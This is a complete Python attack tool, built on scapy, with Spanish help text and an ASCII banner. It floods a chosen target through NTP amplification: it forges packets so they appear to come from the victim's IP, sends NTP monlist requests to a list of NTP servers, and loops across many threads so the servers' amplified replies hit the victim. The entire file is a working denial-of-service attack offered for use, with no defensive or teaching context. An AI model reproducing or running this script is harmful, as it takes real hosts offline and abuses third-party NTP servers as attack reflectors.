from scapy.all import *
import sys
import threading
import time
from colorama import Fore, init

init(autoreset=True)

def deny():
    global ntplist
    global currentserver
    global data
    global target
    ntpserver = ntplist[currentserver]
    currentserver = currentserver + 1
    packet = IP(dst=ntpserver, src=target) / UDP(sport=48947, dport=123) / Raw(load=data)
    send(packet, loop=1)

def printhelp():
    ascii_art = """
 ****     ** ********** *******            **     ********** **********     **       ******  **   **
/**/**   /**/////**/// /**////**          ****   /////**/// /////**///     ****     **////**/**  ** 
/**//**  /**    /**    /**   /**         **//**      /**        /**       **//**   **    // /** **  
/** //** /**    /**    /*******  *****  **  //**     /**        /**      **  //** /**       /****   
/**  //**/**    /**    /**////  /////  **********    /**        /**     **********/**       /**/**  
/**   //****    /**    /**            /**//////**    /**        /**    /**//////**//**    **/**//** 
/**    //***    /**    /**            /**     /**    /**        /**    /**     /** //****** /** //**
//      ///     //     //             //      //     //         //     //      //   //////  //   //   
    """
    texto = """
    NTP amplificador DoS attack
    Use: ntpdos.py <ip> <ntpserver list> <numero de threads>
    Ejemplo: ntpdos.py 1.2.3.4 ntplist.txt 10
    El archivo NTP serverlist debe contener una IP por línea
    ASEGÚRESE DE QUE SU NÚMERO DE HILOS SEA MENOR O IGUAL A SU NÚMERO DE SERVIDORES
    """
    print(Fore.GREEN +ascii_art)
    print(Fore.BLUE +texto)
    exit(0)

if len(sys.argv) < 4:
    printhelp()

target = sys.argv[1]

if target in ("help", "-h", "h", "?", "--h", "--help", "/?"):
    printhelp()

ntpserverfile = sys.argv[2]
numberthreads = int(sys.argv[3])
ntplist = []
currentserver = 0

with open(ntpserverfile) as f:
    ntplist = f.readlines()

if numberthreads > len(ntplist):
    print(Fore.RED + "Ataque cancelado: más subprocesos que servidores")
    print(Fore.RED + "La próxima vez no crees más hilos que servidores.")
    exit(0)

data = b"\x17\x00\x03\x2a" + b"\x00" * 4

threads = []
print("Empezando a inundar: " + target + " usando la lista NTP: " + ntpserverfile + " Con " + str(numberthreads) + " hilos")
print("Use CTRL+C para detener el ataque")

for n in range(numberthreads):
    thread = threading.Thread(target=deny)
    thread.daemon = True
    thread.start()
    threads.append(thread)

print("Enviando...")

while True:
    time.sleep(1)
